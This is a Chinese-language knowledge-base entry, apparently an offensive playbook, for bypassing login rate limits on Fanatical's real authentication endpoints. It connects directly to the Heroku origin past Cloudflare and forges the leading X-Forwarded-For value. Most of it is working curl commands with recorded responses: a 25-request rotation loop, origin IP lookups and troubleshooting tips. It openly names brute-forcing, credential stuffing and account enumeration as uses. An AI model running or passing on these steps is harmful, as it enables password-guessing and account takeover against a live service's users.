# Fanatical 认证端点限速绕过：Heroku 源站直连 + 伪造 X-Forwarded-For 首值换桶

适用两族端点（同一 Heroku 应用，Host admin.fanatical.com，前置 Cloudflare / Cloudflare Worker）：

- `/api/auth/*`：login / register / magic/summon / magic/cast / recaptcha / two-factor，全族共享一个应用层令牌桶；耗尽后 429，直连源站带 XFF 后返回 202 `{"type":"reCaptcha","challengeId":"...","action":"LOGIN"}`（只表示进入业务逻辑，不等于登录成功/账号接管）。
- `/api/publisher-portal/auth/login`：Publisher Portal 登录（API 基址 `https://www.fanatical.com/api/publisher-portal/auth/login`，实为 Heroku 应用）。按 IP 令牌桶约 20 次/窗口，耗尽后 429 空体；口令错误返回 401 `{"message":"Invalid email or password"}`。本组复现未使用 anonid 头。

## 0. 原理与边界
- 后端为 Heroku 应用（响应头 `server: Heroku`、`via: 2.0 heroku-router`），前置 Cloudflare；www 侧还有 Cloudflare Worker（`x-is-cf-worker: 1`）。
- 应用层令牌桶的计数 key 取 **客户端可控 `X-Forwarded-For` 的列表首值**（经首值位置对调实验坐实）。
- 经 Cloudflare 访问时，边缘/Worker 会覆盖或规范化 XFF，所以伪造 XFF 无效，全族一起 429；**绕过 Cloudflare 直连 Heroku GA 源站**（`--resolve` + 自定义域 `Host`）后，应用层拿到的就是客户端原始 XFF，令牌桶 key 随之为攻击者任意指定的 IP → 每个请求一个新桶。
- 边界：只绕过限速，**不绕过 reCAPTCHA**，也不提供登录成功。

## 1. 前置条件
| 项 | 要求 |
|---|---|
| 网络 | 可出网 443；**直连** Heroku GA 源站（不经 Cloudflare） |
| 代理 | 本机若有 HTTP 代理，必须 `--noproxy '*'`，否则代理自己解析 DNS，`--resolve` 失效、请求回到 CF |
| 请求头 | 浏览器类 UA（裸 `curl/x.y` → 403 `Request blocked`） |
| 请求头 | `/api/auth/*` 需 `anonid: <UUIDv4>`（缺失 → 400 `Request blocked`）；publisher-portal 本组复现未用 |
| 请求头 | `X-Forwarded-For: <任意公网 IP>`，每个请求换一个；**要放首位** |
| 凭据 | 不需要 |

## 2. 取源站 IP（GA IP 会变，用前现取）
```bash
nslookup -type=A admin.fanatical.com.herokudns.com 1.1.1.1
# 实测曾返回：3.33.161.45 / 13.248.131.213 / 15.197.152.254 / 35.71.150.51
# 同应用 www 侧也可用：nslookup -type=A www.fanatical.com.herokudns.com 1.1.1.1
```

## 3. 基线：无 XFF → 429
```bash
UA="$ARTEX_UA"
# 直连源站（无 XFF）
curl -sk --noproxy '*' \
  --resolve admin.fanatical.com:443:3.33.161.45 \
  -A "$UA" -H 'Host: admin.fanatical.com' \
  -H 'Content-Type: application/json' \
  -X POST -d '{"email":"probe-nonexist-1606@example.com","password":"x"}' \
  https://admin.fanatical.com/api/publisher-portal/auth/login
# 实测：HTTP/2 429（空体）；同刻连续 5 次全 429
```

## 4. 绕过：直连源站 + 伪造 XFF 首值 → 401 业务响应
```bash
curl -sk --noproxy '*' \
  --resolve admin.fanatical.com:443:3.33.161.45 \
  -A "$UA" -H 'Host: admin.fanatical.com' \
  -H 'X-Forwarded-For: 203.0.113.11' \
  -H 'Content-Type: application/json' \
  -X POST -d '{"email":"probe-nonexist-1606@example.com","password":"x"}' \
  https://admin.fanatical.com/api/publisher-portal/auth/login
# 实测：HTTP/2 401
# {"message":"Invalid email or password"}
```

## 5. XFF 首值判据（坐实计数键位置）
```bash
# 伪造 IP 在首位 → 新桶 → 401
curl -sk --noproxy '*' --resolve admin.fanatical.com:443:3.33.161.45 \
  -A "$UA" -H 'Host: admin.fanatical.com' \
  -H 'X-Forwarded-For: 198.51.100.9, 186.244.201.53' \
  -H 'Content-Type: application/json' -X POST \
  -d '{"email":"probe-nonexist-1606@example.com","password":"x"}' \
  https://admin.fanatical.com/api/publisher-portal/auth/login
# 实测：401

# 真实出口 IP 在首位、伪造值在后 → 命中已耗尽桶 → 429
curl -sk --noproxy '*' --resolve admin.fanatical.com:443:3.33.161.45 \
  -A "$UA" -H 'Host: admin.fanatical.com' \
  -H 'X-Forwarded-For: 186.244.201.53, 198.51.100.9' \
  -H 'Content-Type: application/json' -X POST \
  -d '{"email":"probe-nonexist-1606@example.com","password":"x"}' \
  https://admin.fanatical.com/api/publisher-portal/auth/login
# 实测：429
```
> 结论：限速 key = XFF 列表**首值**；换首位 IP 即换桶，往后追加伪造值无效。

## 6. 批量换桶（验证可持续）
```bash
for i in $(seq 1 25); do
  XFF="203.0.$((113 + i % 2)).$((10 + i))"
  code=$(curl -sk --noproxy '*' -o /dev/null -w '%{http_code}' \
    --resolve admin.fanatical.com:443:3.33.161.45 \
    -A "$UA" -H 'Host: admin.fanatical.com' \
    -H "X-Forwarded-For: $XFF" -H 'Content-Type: application/json' \
    -X POST -d '{"email":"probe-'$i'@example.com","password":"x"}' \
    https://admin.fanatical.com/api/publisher-portal/auth/login)
  echo "$XFF $code"
done
# 实测：25/25 全 401，无一次 429
```

## 7. /api/auth/* 族同手法（另一分支）
```bash
ANON=$(cat /proc/sys/kernel/random/uuid)

# 基线：经 Cloudflare → 429
curl -sk -A "$UA" -H "anonid: $ANON" -H 'Content-Type: application/json' \
  -X POST -d '{"email":"support@fanatical.com","password":"WrongPass123!"}' \
  https://www.fanatical.com/api/auth/login
# 实测：HTTP/2 429

# 绕过：直连源站 + XFF → 202 reCAPTCHA
curl -sk --noproxy '*' --resolve admin.fanatical.com:443:3.33.161.45 \
  -A "$UA" -H 'Host: admin.fanatical.com' -H "anonid: $ANON" \
  -H 'X-Forwarded-For: 203.0.113.201' -H 'Content-Type: application/json' \
  -X POST -d '{"email":"support@fanatical.com","password":"WrongPass123!"}' \
  https://admin.fanatical.com/api/auth/login
# 实测：HTTP/1.1 202
# {"type":"reCaptcha","challengeId":"d6bc8bb1-...","action":"LOGIN"}
```
`/api/auth/*` 全族（login/register/magic/summon/recaptcha/two-factor）共享同一令牌桶，一条被限速时全族 429。

## 8. 判据
1. 同一时间窗内：无 XFF → 429，带任意 XFF → 该端点业务响应（publisher-portal 401 / auth 202），稳定二分。
2. 换 N 个不同 XFF 首值连续请求 N 次，全程无 429。
3. XFF 首值位置对调实验：伪造值在首位 → 放行；真实 IP 在首位 → 429。
4. 只直连不加 XFF 仍 429 → 排除"源站直连本身放行"。

## 9. 失败常见原因
- **走了代理**：`--resolve` 被代理重解析，请求回到 Cloudflare，XFF 被边缘覆盖 → 继续 429。必须 `--noproxy '*'`。
- **经 www + Cloudflare Worker**：Worker 覆盖 XFF，伪造无效，始终 429；必须走源站直连路径。
- **缺 anonid**（/api/auth/*）→ 400 `Request blocked`（应用层 bot 门禁，与本限速无关）。
- **UA 是 curl/x.y** → 边缘 403 `Request blocked`。
- **GA IP 过期**：Heroku GA IP 动态分配，超时/证书不匹配就重新 `nslookup *.herokudns.com`。
- **XFF 伪造值放在列表后面**：只有首位参与计桶，后面的值无效。
- **应用已收紧 trust proxy**（只信任 CF 网段）→ 直连也拿不到 XFF 影响，本手法失效；此时改从其他未受信前置回源。
- **误读响应**：202 + `type:reCaptcha` 只代表进入业务逻辑；401 `Invalid email or password` 就是口令错误，二者都不是登录成功。

## 10. 影响与用途
- 解除 Publisher Portal / 主站认证端点的暴力破解与凭据填充速率约束，可对已知邮箱做无约束口令验证、账号存在性探测（业务差分）。
- 也适用于任何依赖 /api/auth 限速保护的资源（注册、魔法链接、验证码、2FA 触发）滥用。
- 注意保持低速率与授权边界；该绕过不突破 reCAPTCHA 与口令校验本身。

## 11. 关联条目
- kb#509：Heroku 源站直连绕过 Cloudflare Access/WAF（本条的直连前置手法、GA IP 取法与 `--noproxy '*'` 纪律）。
- kb#11：express-rate-limit 通用 XFF 换 key 方法论。
- kb#538：Fanatical `anonid` 头绕过 `Request blocked` 门禁。
- kb#562 / #570：Redash / Flask-Limiter 的同类 XFF 限速绕过。